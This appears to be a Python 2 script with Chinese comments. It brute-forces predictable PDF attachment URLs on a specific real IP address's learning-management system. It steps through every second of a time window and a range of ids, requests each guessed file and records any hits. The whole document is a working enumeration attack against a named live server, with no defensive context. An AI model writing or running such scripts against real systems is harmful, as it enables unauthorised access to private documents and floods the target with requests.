#coding:utf-8
#!/usr/bin/python
#20160121104738_733--20160121115644_827
import requests
import time,sys
import urllib2

target_example='''
http://211.103.228.187/lms/attached/annexNotice/20160121/20160121104738_733.pdf
http://211.103.228.187/lms/attached/annexNotice/20160121/20160121115644_827.pdf
http://211.103.228.187/lms/attached/annexNotice/20160121/20160121130022_918.pdf
'''

def check():

    for id_start in range(734,826):
        time_start_float=time.mktime((2016, 1, 21, 10, 47, 39, 3, 21, 0))
        time_end_float=time.mktime((2016, 1, 21, 11, 56, 44, 3, 21, 0))
        target_count=time_end_float-time_start_float
        print '秒数%s'%target_count
        print '寻找id:%d'%id_start
        print 'over:http://211.103.228.187/lms/attached/annexNotice/20160121/%s_%s.pdf'%(time.strftime('%Y%m%d%H%M%S',time.localtime(time_end_float)),id_start)
        while(time_start_float<=time_end_float):
            #累加时间秒，测试id号，直到时间值等于结束时间值
            test_time=time.strftime('%Y%m%d%H%M%S',time.localtime(time_start_float))
            target='http://211.103.228.187/lms/attached/annexNotice/20160121/%s_%s.pdf'%(test_time,id_start)
            try:
                result=urllib2.urlopen(url=target).read(600)
            except Exception as e:
                print e
            if result.find('Errorpage')==-1:
                print 'success:%s'%target
                print "\n\r"
                print "\n\r"
                with open('success.txt','a+') as hand:
                    hand.writelines('success:%s'%target)
                break
            else:
                print '剩余：%s fail:%s'%(target_count,target)+'\r',
            target_count-=1
            time_start_float=time_start_float+1

if __name__ == '__main__':
    check()
# import requests
# target_example='http://211.103.228.187/lms/attached/annexNotice/20160121/2016012dfa1115644_827.pdf'
# result=requests.get(target_example).content
# print len(result)
#


# for x in range(1,10):
#     target_example='http://211.103.228.187/lms/attached/annexNotice/20160121/2016012dfa1115644_8a%s7.pdf'%x
#